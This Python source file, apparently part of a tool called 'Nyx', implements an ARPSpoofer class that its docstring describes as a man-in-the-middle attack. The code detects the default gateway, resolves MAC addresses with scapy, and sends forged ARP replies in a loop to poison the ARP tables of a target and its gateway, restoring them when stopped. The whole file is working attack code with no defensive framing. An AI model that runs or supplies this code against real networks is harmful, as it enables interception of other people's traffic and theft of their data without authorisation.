import asyncio
import logging
import platform
import socket
import subprocess
import time

logger = logging.getLogger(__name__)


def _get_local_ip(remote_host: str = "8.8.8.8") -> str:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((remote_host, 80))
            return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"


def _get_mac(ip: str) -> str | None:
    try:
        from scapy.all import ARP, Ether, srp
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=3, verbose=0)
        for _, rcv in ans:
            return rcv[Ether].src
    except Exception as e:
        logger.debug("Failed to get MAC for %s: %s", ip, e)
    return None


class ARPSpoofer:
    """Sends forged ARP packets to perform a man-in-the-middle attack."""
    def __init__(self, target_ip: str, gateway_ip: str | None = None, interval: float = 3.0):
        """Initialise the ARP spoofer with target, gateway, and spoof interval."""
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip or self._detect_gateway()
        self.interval = interval
        self._running = False
        self._task: asyncio.Task | None = None
        self._local_ip = _get_local_ip()
        self._local_mac: str | None = None

    @staticmethod
    def _detect_gateway() -> str | None:
        """Detect the default gateway IP for the current platform."""
        sys = platform.system().lower()
        try:
            if sys == "windows":
                out = subprocess.check_output("route print 0.0.0.0", shell=True).decode("utf-8", errors="replace")
                for line in out.splitlines():
                    parts = line.strip().split()
                    if len(parts) >= 3 and parts[0] == "0.0.0.0":
                        return parts[2]
            elif sys == "linux":
                out = subprocess.check_output("ip route show default", shell=True).decode("utf-8", errors="replace")
                parts = out.strip().split()
                for i, p in enumerate(parts):
                    if p == "via":
                        return parts[i + 1]
            else:
                out = subprocess.check_output("netstat -rn", shell=True).decode("utf-8", errors="replace")
                for line in out.splitlines():
                    if line.startswith("default"):
                        parts = line.strip().split()
                        if len(parts) >= 2:
                            return parts[1]
        except Exception as e:
            logger.debug("Gateway detection failed: %s", e)
        return None

    async def start(self):
        """Begin the ARP spoofing loop."""
        if self._running:
            return
        self._running = True
        self._local_mac = await asyncio.to_thread(_get_mac, self._local_ip)
        if not self._local_mac:
            logger.warning("Could not determine local MAC address")
        self._task = asyncio.create_task(self._spoof_loop())

    async def stop(self):
        """Stop the spoofing loop and restore ARP tables."""
        self._running = False
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass
            self._task = None
        await self._restore_arp()

    def _send_arp(self, target_ip: str, spoof_ip: str, target_mac: str | None = None):
        """Send a single forged ARP reply packet."""
        try:
            from scapy.all import ARP, send
            pkt = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac or "ff:ff:ff:ff:ff:ff")
            send(pkt, verbose=0)
            logger.info("ARP sent: %s -> %s (spoofing %s)", target_ip, target_mac or "broadcast", spoof_ip)
        except PermissionError:
            logger.error("ARP spoofing requires admin/root privileges. Run Nyx as administrator.")
        except Exception as e:
            logger.warning("ARP send failed for %s: %s", target_ip, e)

    async def _spoof_loop(self):
        """Continuously send spoofed ARP packets at the configured interval."""
        while self._running:
            try:
                target_mac = await asyncio.to_thread(_get_mac, self.target_ip)
                if not target_mac:
                    logger.warning("Could not resolve MAC for target %s — sending broadcast", self.target_ip)
                gateway_mac = await asyncio.to_thread(_get_mac, self.gateway_ip)
                if not gateway_mac:
                    logger.warning("Could not resolve MAC for gateway %s", self.gateway_ip)
                self._send_arp(self.target_ip, self.gateway_ip, target_mac)
                self._send_arp(self.gateway_ip, self.target_ip)
            except Exception as e:
                logger.warning("Spoof iteration error: %s", e)
            await asyncio.sleep(self.interval)

    async def _restore_arp(self):
        """Restore original ARP entries for target and gateway."""
        try:
            target_mac = await asyncio.to_thread(_get_mac, self.target_ip)
            gateway_mac = await asyncio.to_thread(_get_mac, self.gateway_ip)
            if target_mac and gateway_mac:
                from scapy.all import ARP, send
                send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst=target_mac), verbose=0)
                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst=gateway_mac), verbose=0)
                logger.info("ARP restored for %s and %s", self.target_ip, self.gateway_ip)
        except Exception as e:
            logger.debug("ARP restore failed: %s", e)
